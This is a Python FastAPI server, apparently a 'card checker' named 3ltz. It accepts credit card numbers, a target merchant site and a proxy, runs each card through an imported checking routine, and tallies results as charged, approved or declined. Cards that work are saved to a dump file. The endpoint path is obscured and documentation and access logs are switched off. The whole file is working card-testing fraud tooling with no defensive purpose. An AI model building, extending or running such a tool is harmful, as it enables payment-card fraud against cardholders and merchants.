from __future__ import annotations

import asyncio
import os
import sys
import time
import warnings
from contextlib import asynccontextmanager
from pathlib import Path
from typing import Optional
import datetime

warnings.filterwarnings("ignore")

_here = Path(__file__).resolve().parent
if str(_here) not in sys.path:
    sys.path.insert(0, str(_here))

import uvicorn
from fastapi import FastAPI, Request, Query
from fastapi.responses import JSONResponse

import checker_async

try:
    import psutil
    MEMORY_CHECK_ENABLED = True
except ImportError:
    psutil = None
    MEMORY_CHECK_ENABLED = False
    print("[WARN] psutil not installed. Memory guard disabled.")

MEMORY_LIMIT_PERCENT = 90

PORT = int(os.environ.get("CHECKER_PORT", os.environ.get("PORT", "6767")))
stats_lock = asyncio.Lock()

_stats = {
    "active":   0,
    "total":    0,
    "charged":  0,
    "approved": 0,
    "declined": 0,
    "errors":   0,
    "by":       "3ltz",
    "started":  time.strftime("%Y-%m-%d %H:%M:%S"),
}

def is_memory_exceeded() -> bool:
    if not MEMORY_CHECK_ENABLED or psutil is None:
        return False
    try:
        mem = psutil.virtual_memory()
        return mem.percent >= MEMORY_LIMIT_PERCENT
    except Exception:
        return False

def _save_dump(card: str, site: str, status: str, result: str, amount: str):
    try:
        with open("dump.txt", "a", encoding="utf-8") as f:
            timestamp = datetime.datetime.now().strftime("%Y-%m-%d %H:%M:%S")
            line = f"[{timestamp}] {status.upper()} | {card} | {site} | {result} | ${amount}\n"
            f.write(line)
            f.flush()
    except Exception as e:
        print(f"[ERROR] كتابة dump.txt فشلت: {e}")

@asynccontextmanager
async def _lifespan(app: FastAPI):
    yield

app = FastAPI(title="3ltz", docs_url=None, redoc_url=None, lifespan=_lifespan)

@app.get("/3ltz-status")
async def status():
    return JSONResponse({"ok": True, "api": "3ltz", **_stats})

@app.api_route("/3ltz-xK9qPm2r", methods=["GET", "POST"])
async def check(
    request: Request,
    cc:    Optional[str] = Query(None),
    site:  Optional[str] = Query(None),
    proxy: Optional[str] = Query(None),
):
    if is_memory_exceeded():
        return JSONResponse({"error": "Server is busy"}, status_code=503)

    if request.method == "POST":
        try:
            body = await request.json()
            cc    = body.get("cc",    cc)
            site  = body.get("site",  site)
            proxy = body.get("proxy", proxy)
        except Exception:
            pass

    if not cc:
        return JSONResponse({"error": "Missing cc"}, status_code=400)
    if not site:
        return JSONResponse({"error": "Missing site"}, status_code=400)

    async with stats_lock:
        _stats["active"] += 1
        _stats["total"]  += 1

    t0 = asyncio.get_event_loop().time()

    try:
        result = await checker_async.check_card_async(cc, site, proxy or "")
    except Exception as e:
        async with stats_lock:
            _stats["errors"] += 1
            _stats["active"] -= 1
        return JSONResponse({
            "Status":   "SiteError",
            "Response": str(e)[:150],
            "Price":    "-",
            "Gateway":  "3ltz",
            "Card":     cc,
            "site":     site,
            "elapsed":  round(asyncio.get_event_loop().time() - t0, 2),
        })

    elapsed = round(asyncio.get_event_loop().time() - t0, 2)
    status  = result.get("status", "error")

    async with stats_lock:
        _stats[{"charged":"charged","approved":"approved","declined":"declined"}.get(status,"errors")] += 1
        _stats["active"] -= 1

    if status in ("charged", "approved"):
        _save_dump(cc, site, status, result.get("result", ""), result.get("amount", "0"))

    bot_status = {"charged":"Charged","approved":"Approved","declined":"Declined"}.get(status,"SiteError")

    return JSONResponse({
        "Status":   bot_status,
        "Response": result.get("result", ""),
        "Price":    result.get("amount", "-"),
        "Gateway":  "3ltz",
        "Card":     cc,
        "site":     site,
        "elapsed":  elapsed,
    })

if __name__ == "__main__":
    print("━" * 50)
    print("  3ltz Checker API (NO WORKERS, UNLIMITED CONCURRENCY)")
    print(f"  Port    : {PORT}")
    print(f"  Check   : /3ltz-xK9qPm2r")
    print(f"  Status  : /3ltz-status")
    print(f"  Memory limit: {MEMORY_LIMIT_PERCENT}% (returns 'Server is busy')")
    print("━" * 50)

    uvicorn.run(
        "checker_api2:app",
        host="0.0.0.0",
        port=PORT,
        loop="uvloop",
        access_log=False,
        backlog=4096,
        timeout_keep_alive=55
    )
